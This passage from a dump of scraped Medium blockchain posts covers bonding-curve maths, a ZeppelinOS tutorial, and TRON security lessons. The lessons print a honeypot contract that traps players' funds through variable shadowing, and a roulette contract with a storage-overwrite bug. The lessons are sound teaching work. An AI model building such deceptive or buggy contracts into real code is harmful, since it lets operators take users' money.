increase. This means that this kind of curve, with a non-null initial price, guarantees that the reserve ratio is at least what the constant ratio would be with a null initial price.This comes at the expense of higher prices for users, who in each trade have to pay a fixed contribution to this excess of reserve.Reserved SupplyAnother variant of the standard curves is one in which the market owner reserves some supply that cannot be traded. This makes more sense in a minting curve (one that creates the tokens when they are sold) than in a deposit curve (one which only transfers existing tokens from its own address to the user\u2019s wallet). In one scenario, these reserved tokens do not affect the curve\u2019s price, and the result is simply that it\u2019s as if they did not exist. In a deposit bonding curve, it\u2019s as good as if these had never been deposited in the curve in the first place.The formula for these curves is:As written, this curve would have the same behaviour to the left ofas it has to the right. The only effect of shifting the curve like this is fix a different value for the price of the first token (this is a more complicated way of achieving the same behaviour of the previous section). But it becomes more interesting if we introduce a change of function at pointand instead define, say, a horizontal function between 0 andThe best way to do that is even to join both variants, and write a price function like this:In this situation, the market owner decides to start a Market but reserves the first batch of tokens at a different price: this could be constant; follow a different curve; or even the tokens could be declared as non- tradable, and the price function simply would not be defined in this range. It also sets a minimum price for all future tokens, thus guaranteeing a minimum reward for the owners of the reserved supply who wish to sell their tokens to the curve. And of course, this curve also guarantees a minimum reserve ratio of k.The reserve itself now has to be calculated in two parts, one for each branch of the function, but aside from that, there is nothing mathematically new in this function. The formula for the reserve is this:Quasi-polynomial function typesThe polynomial functions examined in the post referred previously do not exhaust all the capabilities. If we relax the fixed reserve requirement, we could experiment with other functions. A good way to choose a function is to think a priori of the behaviour and incentives we want to enforce in the market, and then see how to model them. We can see an example of this in this post by Wilson Lau, where the following function is derived (in general terms):Despite the logarithm in the exponent, this can still be rewritten asforwhich falls exactly in the previous case of the reserved supply.But there is also a second formula that is another kettle of fish, and introduces a whole new shape:There are 5 different parameters here, which complicate things a little. We can rewrite the above like this:which is not an immediate improvement but clarifies something: the dominant term here is of the formwhich, once it turns positive, is a function that grows extremely slow. For reference, it turns 1 forit is 2 forand it turns 3 forGiven this rate of growth, for most practical applications it can probably be considered a constant, which places the above price formula in the company of a more boring class of function likeBut this happens only after x turns smooth. It is a wholly different affair for small values of x, where the price function plunges almost vertically (depending on the choice of constants), until turning around and emulating a simple power function. This initial drop in value may not be suitable for normal market incentives, so study your curve well before implementing one, and in particular have an idea of the maximum and minimum range of supply the market is going to work. Here is an example of 3 curves of this type:Exponential FunctionsThe last example introduced the possibility of using the variable in the exponent (albeit tempered by a double logarithm function). This opens the door to the simple but dramatic exponential function. On the surface, its graph is similar to power functions of exponent larger than 1 and for positive variable. When the variable is negative, these functions are radically different: the exponential function will seem to hug the horizontal axis, being almost a horizontal line, but the power functions will be a symmetric of the positive side of the graph: if the exponent\u2019s numerator is even, it will be symmetric around the y-axis; if it is odd, it will be symmetric around the origin point. Another difference is that the power functions pass through the origin of the chart, and a vanilla exponential function does not. But with a little tweaking, we can write an exponential that does, eg:Despite the similarities, the exponential function is NOT like a power function: it grows much, much faster than any polynomial function (for large enough x). An example of this is in the next figure, that shows the exact same functions as above for modest, but larger, values of supply (up to 20). See how the exponential function takes off in relation to the others.The exponential function has a very simple integral, and we can easily check that it does not produce a constant ratio. Below, I list a generic exponential price function, the corresponding reserve and the calculation of the reserve ratio.The reserve ratio iswhich shows this varies with the supply, and so is not constant.Logarithmic FunctionsThe logarithmic function is like the mirror of the exponential function. While the exponential function grows very fast and approximates a vertical curve, the logarithmic function grows very slowly, and instead approximates a horizontal.The next figure shows a comparison of the logarithmic function with power functions of exponentsTheir approximate shapes are similar, and one could think the logarithmic function (in a dashed line) to be just of the same type as the power functions. It does overtake two of the others, and from this small example it looks like it could dominate them. However, this is short lived behaviour. The truth is that as S tends to infinity, the logarithmic function grows slower and slower and slower, until it is overtaken by all other power functions.The graph below shows the same functions in the vicinity of S= 90000 where the log function is already the smallest of the bunch.The integral ofis more complicated than the previous ones:Potential drawbacks of this function include the necessity to implement a logarithmic function, since this is not available in solidity off the shelf. It also is not easy to generalise the above function itself by increasing the degree oftowhich includes a trigonometric function in the integral. Higher exponents don\u2019t even have a closed integral formula.Negative ExponentialAn interesting alternative to the logarithm function may be the negative exponential. Unlike the logarithm, which grows indefinitely and tends to infinitely (albeit at a very slow pace), the negative exponential has a true horizontal asymptote, meaning that it will approximate a true horizontal function and never go over a limit value. For example:approximates the maximum value C. The rise of the function is steep forand the passage to the near-horizontal regime is almost abrupt. To make the rise softer, we can make a much smaller, as long as it is still positive.The integral (and therefore the reserve) is not complicated:Here is an example graph:ConclusionIn this long post, I have gone over several possible price functions for Token-Bonding Curves (TBC), and talked a little about their properties and how to compute their integral. The choice of function should primarily be dictated by the desired incentive, possibly by sketching a chart with the desired behaviour and then identifying a function close to it.Importantly, any choice must then be validated according to the ease or difficulty of implementing the necessary functions. In a TBC, we want both to sell and buy tokens from the curve. We only need to compute the integral of the price function if we want to sell or buy a given number of tokens, but if we want to buy or sell tokens equivalent to a given amount of the reserve currency, then we need the inverse function of this integral.To ease on the maths (which is already rather heavy) I have not given any of these inverse functions. This is a bigger challenge than it seems on the surface. For example, the inverse of the reserve for a function in the section \u201cPositive initial price\u201d would involve solving a polynomial equation of the kindwhich for high values of k is not straightforward.The exponential functions would not pose much of a problem, nor would the simpler function in \u201cQuasi-polynomial function types\u201d. The second kind in this section, however, would be very hard to solve analytically for both the reserve and its inverse. This also applies to the inverse of the reserve for a logarithmic function. Finally, even the negative exponential reserve is not easy to invert.This makes it difficult to use most of the functions in this list in a TBC where we want to specify a currency value instead of the number of tokens to buy or sell (which is common in financial markets), but it is possible to provide a market that does not include the former. This is more similar to the material world, where many markets only work that way: we usually don\u2019t buy 20$ worth of apples or meat, but rather look for a specified quantity or weight.About the AuthorAlex is a software engineer at Aventus, working on the blockchain engineering team. He has 20 years of experience working in technology, completing a PhD in Computer Science as well as a post-doctorate in Cryptography. As part of his research, Alex has published papers on Kolmogorov Complexity, Cryptography, Database Anonymization and Code Obfuscation.Alex also spent seven years lecturing at the University Institute of Maia, including directing the degree programmes for BSc Computer Science and Information Systems and Software.This article was originally posted on his blog.", "responses": 0, "tags": ["Mathematics", "Cryptography", "Blockchain", "Token Bonding Curve", "Aventus"]}, {"title": "Zeppelin OS Tutorial 101", "post_link": "https://medium.com/quiknode/zeppelin-os-tutorial-101-62c1202dd072?source=search_post", "author_name": "Gaurav Agrawal", "author_link": "https://medium.com/@gaurav.agrawal", "publish_date": "2019-05-30", "last_modified_date": "2019-05-30", "readtime": "4.48", "claps": 38, "voters": 5, "content": "Zeppelin OS Tutorial 101Building Upgradable Solidity Smart ContractsGaurav AgrawalFollowMay 30 \u00b7 5 min readZeppelin OS IntroductionZeppelin is all about Smart Contract development. The team has helped many developers build Smart Contracts with openzeppelin-solidity, one most downloaded web3 libraries on NPM (with over 10k downloads every week!). According to Zeppelin\u2019s website:\u201cZeppelinOS is a development platform designed specifically for smart contract projects. It allows for seamless upgrades and provides economic incentives to create a healthy ecosystem of secure applications.\u201dWhat problem does it solve?ZeppelinOS helps developers build upgradable smart contracts using libraries that anyone can use on the Ethereum blockchain. Unlike traditional contracts (which can remain frozen forever on the blockchain, with mistakes, limited functionalities, etc...), ZeppelinOS allows users to opt-in & allow upgrades of contracts, opening the doors to a more sustainable process for developing web3 blockchain projects. With upgrades, we can make iterative releases, quickly add small pieces of functionalities (that we can adjust according to the always changing goals of our users), and of course, we can implement fixes for bugs we had introduced on previous iterations.Building on ZeppelinOSLet\u2019s build an upgradable CrudApp contract! We will deploy CrudApp.sol and then update it while preserving its data\u2026 so let\u2019s start:1- Create a project and install dependenciesmkdir crudcd crudnpm initnpm install --global zos2- Initialize your projectzos init crudThis command will create a zos.json file, which contains all the information about the project. For details about this file, see the configuration files page.The command will also initialize Truffle. So by now, inside the crud directory you should have a package.json file (created by npm), two empty directories named contracts and migrations, a truffle-config.js file (created by zos for Truffle), and a zos.json file (created by zos for ZeppelinOS).3- Add CrudApp.sol contractLet\u2019s add our CurdApp.sol now. We will make some changes in our previous Smart Contract, so let\u2019s understand them:CrudApp.solRemoving Constructor and adding an Initializer\u201cYou can use your Solidity contracts in ZeppelinOS without any modifications, except for their constructors. Due to a requirement of the proxy-based upgradeability system, no constructors can be used in upgradeable contracts. You can read in-depth about the reasons behind this restriction in the ZeppelinOS Upgrades Pattern page.\u201dThis means that, when using a contract within ZeppelinOS, you need to change its constructor into a regular function, typically named initialize, where you run all the setup logic:function initialize(uint256 countryLimit) initializer public {   totalCountries = 0;   limit = countryLimit;}You need to import Initializable.sol too for this to work:import \"zos-lib/contracts/Initializable.sol\";Install Ganache and deploy your projectWe will use Ganache (local blockchain) to deploy our Smart Contract. You can change network settings in truffle-config.js if you want to use a different network. Open a different terminal and run below commands:npm install -g ganache-cliganache-cli --port 9545 --deterministicNow go back to the previous terminal and run below commands to start a session. We are using --network option for local network and --from [address] to provide an Ethereum address (which we are going use to deploy the smart contract). We are using a default Ganache address (you can see it on the Ganache terminal) and we are also using an additional expires flag to define the number of seconds this session will be valid (1 hour in this case).zos session --network local --from 0x1df62f291b2e969fb0849d99d9ce41e2f137006e --expires 3600Now let\u2019s deploy our project:zos pushThis command deploys CrudApp to the local network and prints its address. You can deploy more contracts using add command and they will also get deployed after this command.The push command also creates a zos.dev-<network_id>.json file with all the information about your project in this specific network, including the addresses of the deployed contract implementations in contracts[\"MyContract\"].address. You can read more about this file format in the configuration files section.Upgrade the Projectpush command deploys logic contracts which are not intended to be used directly, so instead we need an upgradable instance (we will cover logic contracts and ZeppelinOS Upgrades Pattern page in our future blogs).Now let\u2019s create an upgradeable instance of our CrudApp.sol:zos create CrudApp --init initialize --args 200The zos create command uses optional --init [function-name] with the function name (which is initialize in our case). You can also pass arguments for this function (which is 200, limitation of countries) in our case. This will also print a Smart Contract address, which we will use while interacting with it.Interacting with the ContractNow let\u2019s interact with our contract and insert some countries. To get to the Truffle console, run below command:npx truffle console --network localYou will now see the Truffle console. Let\u2019s run some commands and insert some countries:truffle(local)> crud = CrudApp.at('<your-contract-address>') truffle(local)> crud.limit()truffle(local)> crud.insert(\"USA\", \"Elizabeth Warren\", 33000000)truffle(local)> crud.getCountry(\"USA\")truffle(local)> crud.getTotalCountries()We have inserted one entry in our Smart Contract. Let\u2019s update our CrudApp!Adding a functionWe will add an extra function at the end of our Smart Contract and update it. So, for now, we already have a getCountry() function\u2026 we will add one more getLeader() function in our Smart Contract.function getLeader(string leaderName) public view returns(string name , string leader , uint256 population){        for(uint256 i =0; i< totalCountries; i++){           if(compareStrings(countries[i].leader, leaderName)){              //emit event              return (countries[i].name , countries[i].leader , countries[i].population);           }       }       revert('Leader not found');   }Now let\u2019s update our Smart Contract. We need to run below commands for that:zos pushzos update CrudAppThis will print a new Smart Contract address which we\u2019ll use for testing our updated contract.Testing updated Smart ContractNow let\u2019s test our Smart Contract. It should preserve our previous data and we can access our new getLeader() function. So let\u2019s interact with our Smart Contract again:truffle(local)> crud = CrudApp.at('<your-contract-address>') truffle(local)> crud.limit()truffle(local)> crud.getTotalCountries()truffle(local)> crud.getLeader(\"Elizabeth Warren\")You will see able to see the results, that the Smart Contract was updated just like any other piece of code. \ud83c\udf70 \u2014 We will build an upgradable ERC-20 token in our next article!ConclusionThough it seems pretty easy, we need to be pretty careful while using ZeppelingOS because of Solidity storage management. You can check here about the thing you need to pay extra attention to while updating your Smart Contract. ZeppelinOS is a great value addition to the Ethereum ecosystem!Let us know what you want to learn about in the comment section.\ud83d\udc47About QuikNodeQuikNode is building infrastructure to support the future of Web3. Since 2017, we\u2019ve worked with hundreds of developers & companies, helping scale dApps and providing high-performance Ethereum nodes. We\u2019re working on something interesting from the past few months and will be launching soon, so subscribe our newsletter for more updates!! \ud83d\ude03", "responses": 0, "tags": ["Ethereum", "Zeppelin", "Smart Contracts", "Solidity", "Web3"]}, {"title": "Learn: New In-Depth Course for ERC721/NFTs at Zastrin", "post_link": "https://medium.com/blockchannel/zastrin-new-in-depth-course-for-erc721-nfts-14bc0609e87c?source=search_post", "author_name": "Steven McKie", "author_link": "https://medium.com/@McKie", "publish_date": "2018-09-18", "last_modified_date": "2018-09-19", "readtime": "0.85", "claps": 68, "voters": 4, "content": "Learn: New In-Depth Course for ERC721/NFTs at ZastrinLearn Solidity While Building Real ProjectsSteven McKieFollowSep 18, 2018 \u00b7 1 min readZastrin is excited to announce the release of a new course ERC-721/NFT \u2014 The complete developer\u2019s guide. If you have heard of CryptoKitties or CryptoPets, you know what NFT (Non-Fungible tokens) are. There is lot of activity in the Ethereum ecosystem around NFTs and many NFT based applications are being built. Now is a good time to jump in and learn and build some NFT dApps to stay ahead of all the innovation happening in the space.In this course, you will start from the basics \u2014 learn the concept of tokens, various types of tokens and then focus on Non fungible tokens. You will learn to build a complete NFT based application using Solidity smart contracts and Javascript+HTML (frontend). You can check out a demo of application you will be building here.You can also use the coupon \u2018BlockChannel\u2019 to get 50% off the course!If you have any other questions, just contact Zastrin via Mahesh@Zastrin.com", "responses": 0, "tags": ["Ethereum", "Solidity", "Erc721", "Non Fungible Tokens", "Education"]}, {"title": "Digix Seattle Meetup Presentation Videos \u2014 Nov 2016", "post_link": "https://medium.com/@Digix/digix-seattle-meetup-presentation-videos-c6264ed447c?source=search_post", "author_name": "Digix", "author_link": "https://medium.com/@Digix", "publish_date": "2016-12-05", "last_modified_date": "2018-04-09", "readtime": "0.16", "claps": 2, "voters": 2, "content": "Digix Seattle Meetup Presentation Videos \u2014 Nov 2016DigixFollowDec 5, 2016 \u00b7 1 min readSolidity Contract patterns and security \u2014 presentation by Anthony Eufemio (Digix CTO)Javascript testing framework for Solidity smart contracts \u2014 presentation by Chris Hitchcott (Digix Core Dev)Special Thanks: Kenny Rowe from MakerDAO for editing the videos", "responses": 1, "tags": ["Ethereum", "Blockchain"]}, {"title": "", "post_link": "https://medium.com/@davekaj/hey-gabriel-d2f7b17ccae1?source=search_post", "author_name": "Dave Kajpust", "author_link": "https://medium.com/@davekaj", "publish_date": "2018-08-11", "last_modified_date": "2018-08-11", "readtime": "0.32", "claps": 54, "voters": 3, "content": "Hello Dave, I am currently looking to change careers and I have been around one year in the \u201cCrypto\u20261Gabriel MacuareDave KajpustFollowAug 11, 2018 \u00b7 1 min readHey Gabriel,Yes two years should do it. If you did it full time you could be a decent solidity developer in one year.The trick is to just develope as much as you can. The first 4 months will be hard. That is why I recommend taking a Javascript / web development bootcamp first. Javascript is a great way to learn.After 6 months of javascript move on to solidity. It will take a lot of hard work but it is worth it!Da e", "responses": 0, "tags": []}, {"title": "TRON Developer Guide \u2014 Converting Ethereum Contracts", "post_link": "https://medium.com/@Tronfoundation/tron-developer-guide-converting-ethereum-contracts-b693f93d470a?source=search_post", "author_name": "TRON Foundation", "author_link": "https://medium.com/@Tronfoundation", "publish_date": "2019-05-24", "last_modified_date": "2019-05-24", "readtime": "1.11", "claps": 69, "voters": 2, "content": "TRON Developer Guide \u2014 Converting Ethereum ContractsTRON FoundationFollowMay 24 \u00b7 2 min readFor users wishing to deploy existing Ethereum solidity contracts onto the TRON network, there are some key differences to look for:Units of CurrencyUnits of currency in TRON smart contracts are TRX and sun. To successfully migrate your Ethereum smart contracts to TRON, please change Ether denominations into TRX denominations, while being mindful of the Ether/TRX market exchange rates. Remember that 1 TRX = 1,000,000 sun. The Ether denomination table is listed here for your reference.For example, in the below figure, the ether term is changed to trx. At the same time, the average exchange rate of TRX to Ether on this day is 8400 TRX to 1 Ether. Thus, after the units are converted, the quantity is also adjusted to ensure a minimal change in value.User Pay RatioUser pay ratio is defined as the ratio of the cost the smart contract user should pay. This parameter accepts any integer between 0 and 100, inclusive. However, it is strongly recommended to set the value between 1 and 99. The reason is to protect yourself, the contract developer, from malicious infinite loop time-out attacks.", "responses": 0, "tags": ["Tron", "Trx", "Tronnews"]}, {"title": "Smart Contract Security Class (No.004)", "post_link": "https://medium.com/@Tronfoundation/smart-contract-security-class-no-004-bd9002fc330?source=search_post", "author_name": "TRON Foundation", "author_link": "https://medium.com/@Tronfoundation", "publish_date": "2019-06-10", "last_modified_date": "2019-06-10", "readtime": "3.27", "claps": 2, "voters": 2, "content": "Smart Contract Security Class (No.004)TRON FoundationFollowJun 10 \u00b7 4 min readIn this class, we will use the two contracts from TRON-Eye to talk about inheritance features in Solidity, and possible vulnerabilities or attacks on TRON. At the same time, everyone is welcome to follow @tron official twitter, and submit your contract code.The following is the contract code from https://troneye.com (hereinafter referred to as TRON-Eye). TRON-Eye is a TRON verification platform from the community. The previous classes have introduced the TRON-Eye verification platform in detail. Figure 1 shows the contract, HonestBank (contract address: TYSXj1cx6rGVHSuTwogJs3zdqTkbmUjtoy).Figure 1 contract HonestBank on TRON-EyeThe code for the HonestBank contract is short and the core code is as follows.contract Owned {address public owner;function Owned() { owner = msg.sender; }modifier onlyOwner{ if (msg.sender != owner) revert(); _; }}contract HonestBank is Owned {address public owner = msg.sender;uint256 ecode;uint256 evalue;function useEmergencyCode(uint256 code) public payable {if ((code == ecode) && (msg.value == evalue)) owner = msg.sender;}function withdraw(uint amount) public onlyOwner {require(amount <= this.balance);msg.sender.transfer(amount);}Intuitively, this contract allows the player to enter the correct code and at the same time give the contract a specified amount of trx, then become the owner of the contract. Once you become owner, you can take all the balances of the contract. The correct code and the specified balance are set by the contract deployer via setEmergencyCode(uint256 code, uint256 value) .Figure 2 transaction setEmergencyCode on TronScanSince the contract deployer\u2019s call to setEmergencyCode is available through tronscan.org. Well, you might think: \"The opportunity is coming, I can take the contract money away!\"So is it right? This involves the issue of inheritance in Solidity. Before we start, let\u2019s write a simple test for you with the SClass04_01 contract. SClass04_01 (contract address: TAteb3fS3CgtruSkPPTf9WN84wKs1G4C94).Figure 3 contract SClass04_1 on TRON-EyeThis is a simple test contract, Class4 inherits from the parent class Base contract. The subclass Class4 and the parent class Base have the variable variable of the same name. Both subclasses and parent classes have functions with the same name or different names for the variable operation. We use this example to test the inheritance features in Solidity.The inheritance principle of Solidity is code copy, so in other words, the test1 of the parent class Base manipulates the variable in the parent class, the variable in the test2 manipulation subclass of the child class Class4, and the test2 in the parent class does not exist because it is not called.The actual execution can be found that the test2 operation of the Class4 contract is a variable in the subclass, but the test1 operation is the variable in the parent class. The fact that the Class4 contract is equivalent to:contract Class4{uint variable1 = 0;uint variable2 = 0;function getV1() public view returns(uint){return variable1;}function getV2() public view returns(uint){return variable2;}function test1() returns(uint v){variable1++;return variable1;}function test2(uint a) returns(uint v){variable2++;return variable2;}}In other words, each storage variable of TVM will have a uniquely identified slot id. In the example below, although they are called variable, from the bytecode point of view, they are determined by different slot ids, so it has nothing to do with what the variable is called.Looking back at the previous HonestBank contract, you will find that the contract's onlyOwner is a utility that is the owner of the parent class. This has been fixed at the time of contract deployment and can never be modified. The owner variable in the subclass of other players modified by useEmergencyCode. In this way, the HonestBank contract actually constitutes a honeypot attack, tempting the player to think that he can take the money and recharge the contract.This class will be end here. Thanks to TRON-Eye for providing the contract verification tool. More information about them can be found directly on their website https://troneye.com.We continue to call for source code for follow-up classes, and we welcome your official twitter submissions.", "responses": 0, "tags": ["Tron", "Tronnews"]}, {"title": "Smart Contract Security Class (No.005)", "post_link": "https://medium.com/@Tronfoundation/smart-contract-security-class-no-005-5f89a047c032?source=search_post", "author_name": "TRON Foundation", "author_link": "https://medium.com/@Tronfoundation", "publish_date": "2019-06-13", "last_modified_date": "2019-06-13", "readtime": "2.87", "claps": 51, "voters": 2, "content": "Smart Contract Security Class (No.005)TRON FoundationFollowJun 13 \u00b7 3 min readIn this class, we will talk about the big issue about struct in Solidity, and the possible vulnerabilities. At the same time, everyone is welcome to follow @tron official twitter, and submit your contract code through TRON-Eye.The following is the contract code from https://troneye.com (hereinafter referred to as TRON-Eye). TRON-Eye is a TRON verification platform from the community. The previous classes have introduced the TRON-Eye verification platform in detail. This time involves 3 contracts, RouletteV0 (contract address: TPJyhLPZqbxZqhU5XdCKTRLwM2BdeUHtqn), RouletteV1 (contract address: TJaDCgk9FV1ycDHRbZeH45RcnCxovp7tmj), RouletteV2 (contract address: TS5qqRT6D8k9uYnChVFZGwYtuVvXGMMNNQ).Figure 1 contract RouletteV0on TRON-EyeThe code for the RouletteV0 contract is very short, the core code is as follows.1. contract RouletteV0 {2. uint256 public secretNumber;3. uint256 public lastPlayed;4. uint256 public betPrice = 1000 trx;5. struct Game {6. address player;7. uint256 number;8. }9. Game[] public gamesPlayed;10. constructor() public {11. shuffle();12. }13. function shuffle() internal {14. // randomly set secretNumber with a value between 1 and 2015. secretNumber = uint8(keccak256(abi.encodePacked(now, blockhash(block.number-1)))) % 20 + 1;16. }17. function play(uint256 number) payable public {18. require(msg.value >= betPrice && number <= 10);19. Game game;20. game.player = msg.sender;21. game.number = number;22. gamesPlayed.push(game);23. if (number == secretNumber) {24. // win!25. msg.sender.transfer(address(this).balance);26. }27. shuffle();28. lastPlayed = now;29. }The name of the contract is called roulette. When the contract is initialized, a random number of 1\u201320 is set: secretNumber. The player tries to guess the number by calling play(). If it is correct, the player can take away all the money in the contract and reset the random number secretNumber. For the convenience of presentation, the contract\u2019s secretNumber is set to public.Play() needs to meet two conditions to get the contract money:1. msg.value >= betPrice, which means that at least 1000 trx needs to be sent for each quiz.2. number <= 10, the number of the quiz cannot be greater than 10.The contract looks like you get 50% chance of taking all trx or throwing a bet. So is that true? A few simple tests will reveal that it you will never win. Why?19. Game game;20. game.player = msg.sender;21. game.number = number;22. gamesPlayed.push(game);In fact, the problem lies in the four lines of code shown above. Lines 19~21 will directly change the solt-0 and solt-1 member variables of the contract, that means, the values of secretNumber and lastPlayed will be changed to uint256 (msg.sender). ) and uint256(number). And uint256 (msg.sender) is usually a very big number, of course, play() can\u2019t get money.23. if (number == secretNumber) {24. // win!25. msg.sender.transfer(address(this).balance);26. }27. shuffle();Even more amazing is that the 27 line of play() resets the secretNumber to a value in the range of 0\u201320. Everything looks perfect.In fact, this is a bug in Solidity 0.4.x. The strut variable in a function without the memory or storage attribute uses the same storage as the contract member variable. When the struct is manipulated, the value of the member variable is modified. This bug has been fixed in Solidity 0.5.x.Then the correct code should be specify the game variable to memory, so that even if it assigns a value to the game again, it will not overwrite the member variables of the slot-0 and slot-1 positions. (Complete code, see RouletteV1 at https://troneye.com/reveal?address=TJaDCgk9FV1ycDHRbZeH45RcnCxovp7tmj)Game memory game = Game(msg.sender, number);game.player = msg.sender;game.number = number;gamesPlayed.push(game);The correct final version is simplified (see RouletteV2 at https://troneye.com/reveal?address=TS5qqRT6D8k9uYnChVFZGwYtuVvXGMMNNQ for complete code):gamesPlayed.push(Game(msg.sender, number));This class will be end here. Thanks to TRON-Eye for providing the contract verification tool. More information about them can be found directly on their website https://troneye.com.We continue to call for source code for follow-up classes, and we welcome your official twitter submissions.", "responses": 0, "tags": ["Tron", "Tronnews"]}, {"title": "", "post_link": "https://medium.com/@davekaj/check-out-ibm-hyperledger-a320d4e77d29?source=search_post", "author_name": "Dave Kajpust", "author_link": "https://medium.com/@davekaj", "publish_date": "2018-03-21", "last_modified_date": "2018-03-21", "readtime": "0.29", "claps": 2, "voters": 2, "content": "Yeah\u2026havent found much on go\u2026can you suggest ways to practice nad implement the smart contracts for\u20261Ajas BakranDave KajpustFollowMar 21, 2018 \u00b7 1 min readcheck out ibm hyperledger https://www.ibm.com/developerworks/cloud/library/cl-ibm-blockchain-chaincode-development-using-golang/cl-ibm-blockchain-chaincode-development-using-golang-pdf.pdfother than that the best way i have found is using solidity on ethereum. they have the most development by far for smart contracts. i would suggest finding some simple contracts and reviewing them, and then trying to recreate building them on https://remix.ethereum.org/starting with a simple ICO contract from Zepplin would be a good idea ! https://github.com/OpenZeppelin/zeppelin-solidity/tree/master/contracts", "responses": 0, "tags": []}, {"title": "", "post_link": "https://medium.com/@P1xt/i-think-app-academy-is-a-great-start-no-matter-your-eventual-destination-e264ffd262fa?source=search_post", "author_name": "P1xt", "author_link": "https://medium.com/@P1xt", "publish_date": "2019-07-04", "last_modified_date": "2019-07-04", "readtime": "0.85", "claps": 11, "voters": 2, "content": "I\u2019m glad I got through a lot of the LE courses before that happened.1GarrettP1xtFollowJul 4 \u00b7 1 min readI think App Academy is a great start \u2014 no matter your eventual destination. The reason being: it doesn\u2019t \u2018just\u2019 teach a language (ruby and javascript) a framework (rails) or a library (react). It teaches software engineering principles that will help you learn to write good code. Code that\u2019s efficient, modular, easy to read, tested and easy to test. The fact that it\u2019s being taught using ruby as the language is pretty irrelevant \u2014 you\u2019re there to learn concepts, and from what I\u2019ve seen thusfar in the course, ruby is a language that makes teaching those concepts simple \u2014 whatever you go onto next, the concepts will remain \u2018the important part\u2019 and they will translate to whatever language you end up using.Sure, eventually you may have to learn \u201cFabric, or Solidity, Viper, Go, etc.\u201d but learning a language or library is NOT the hard part \u2026 learning to write code that isn\u2019t shitty is the hard part, you learn that once and learn it well, and the rest will be a breeze by comparison. App Academy Open isn\u2019t just about learning Ruby, if it were just that, I\u2019d say it\u2019s not relevant to your goals. But, it is relevant \u2014 it will teach you to write good code, a skill that will inform all your future coding, and all your future learning. It is worth it.", "responses": 0, "tags": []}, {"title": "The Book and the Article", "post_link": "https://the-politic.com/the-book-and-the-article-d6a85b7f9c41?source=search_post", "author_name": "Michael Marinaccio", "author_link": "https://the-politic.com/@Marinaccio", "publish_date": "2015-11-30", "last_modified_date": "2017-09-14", "readtime": "5.57", "claps": 1, "voters": 1, "content": "The Book and the ArticleMichael MarinaccioFollowNov 30, 2015 \u00b7 6 min readThe Old Library at Trinity College Dublin: http://m.marinacc.io/1Ir0svbBooks are solid. This is at once a physical description and a metaphysical one, and it is on this metaphysical solidity that we ought to ground our loyalty to the book over and against the allure of the ever-changing screen.Reading can be considered the essential art \u2014 along with writing, speech and oral tradition which together comprise the essential parts of wisdom. It is a widely held belief that the more you read, the more \u201cwell-read\u201d you are, and the more educated you are.However, the manner and medium in which you receive information has a huge effect on how you listen, learn, and retain it. I am much more likely to comprehend the nuances of Plato\u2019s Republic in a classroom or on my favorite sofa than in a loud pub or during a senior staff meeting.How we receive information matters.If technology has had an effect on anything, it has likely been on the written word. The relationship between a reader and a book is thousands of years old and requires no real explanation. But the excessive influx of concise, visual media: tweets, blog posts, videos, audio books, memes; they all point to a transformation of the written word. Some call it a truncation or an over-simplification of normal substance. Others call it noise. Many optimistically call it \u201ca new way of communicating.\u201dRegardless of your emotion toward the rapid, vapid growth of instantaneous media, the fact remains that each newly introduced medium modifies the relationship between the individual and the information in some way. Reading is no longer picking up an interesting book or required reading but receiving an email, having an interesting photo catch your eye, or skimming article headlines.Add in a complex layer of marketing professionals, big data gurus and ad managers who will tweak or leverage that relationship in order to make money and you have a real clog of incentives.Reading is no longer that simple.The RelationshipFor the sake of clarity, I will use \u201cthe relationship\u201d to describe the interaction between the reader and information.The relationship is of key importance. On their face, the book and the article appear identical. The only discernable difference is the physical nature of the book versus the screen on which we read the article. However, I will argue that the relationships we have with each medium are dramatically different and our failure to recognize those differences is a huge threat to knowledge.The BookThe physical book has humble beginnings, really. Long before we were expressing insights or opining philosophy in them, the written word was reserved for record-keeping. The relationship between the book and individual, thousands of years before Christ, was pretty simple:X is important. We wrote X down so that if you need to reference X, it is easily attainable. You do not have to ask N people for X.The book\u2019s first purpose was to exist as a source of knowledge, a lexicon. Like coin to make bartering more fluid and transactional, the book was used to record and keep knowledge in one place so that others may more easily attain it. This could include historical, philosophical, mathematical or even literary narratives.For just one book, dozens of men would comb over every letter, every detail and tirelessly replicate the same information and illustrations by hand thousands of times. The book was not only a metaphorical symbol of knowledge but a physical manifestation of it; knowledge with mass. It was due great honor for the intensive labor put into it \u2014 even before its contents.The point here is that the relationship between the reader and the book originated as a reservoir for only the most crucial information or stories, information set in stone and often incredibly difficult to someone untrained in the particular study. These studies would provide an intellectual or moral grounding for anyone reading.The book does not pander to its reader. It is a record of knowledge. It is a challenge.There are thousands, maybe millions of books on Amazon now that do exactly that (pander) but I would like to discard them from this discussion as they are part of the greater problem described earlier. Let us pretend we live in a world where the original reason for keeping books is honored and bad books are always rejected publishing.With this definition, we can understand the concrete importance of the book and our relationship to it. The book is without want or desire. We ascend to the book. We admire it. We seek to learn from the book and achieve the intellectual rewards it supplies. The book does not seek us out in any way.It is only in the deconstruction of the book do we begin to see a wanting of equality with the book. Every author who ever began writing started with a pure motivation to have his novels among Chesterton and Hemingway.The ArticleThe article stems of lesser estate, the origins of which can be found in the telegraph, early newspapers, and propaganda. The article has its roots in information dissemination as well as persuasion.We can see that the relationship between the reader and the article is immediately different than the book. The idea of the article is to persuade and inform of events and facts, whereas the book is to retain ideas and educate. The ephemeral nature of the article makes it impossible to keep other than for reason of nostalgia. You would have to be crazy to collect newspapers and study them hoping to learn something.It can be argued that the article can teach. And I would say that every piece of writing begins at its purest form and degrades in exchange for other traits, be it messaging, brevity, reading level or funding. Every good article starts as a book and ends as a contrived product of many.Much like the book, the article moves through just as many men and in similar ways. But the focus is subjective and constantly changing. Where monks could suffer long hours to maintain the intricate details of an objective duplication, journalists spend the same time manufacturing a story in the first place.The book is merely a place to store understood knowledge, but articles seek to create knowledge from people and events, a glorified non-fiction short story. However, unlike a good short story, the article is written by many authors for many reasons, the least of which is understood by the original writer.The article is also always subject to change. If something unforeseen occurs or a writer is grossly incompetent, words are fluid. Online, corrections can be made without anyone realizing. Links can be changed, photos can be swapped and information can be doctored. The living organism of the modern article opens itself to many weaknesses.But the largest weakness of all is the relationship between the reader and the article. The article seeks out its reader and is ultimately aimed at pleasing someone. Even the most substance-filled long-reads find themselves echoing a derivative of the book.The Information ThresholdThe internet offers us an infinite sea of information. I know colleagues who feel that unless they are constantly absorbing some of that seawater they are missing out or uninformed. But sea-sickness is deceitful.Each moment we spend exercising our mind has a cost of time and energy, and unfortunately we do not retain everything. In fact, science shows us that unless we have 1) a desire to learn, 2) a practical application for the knowledge and 3) some great eureka moment of self-discovery, 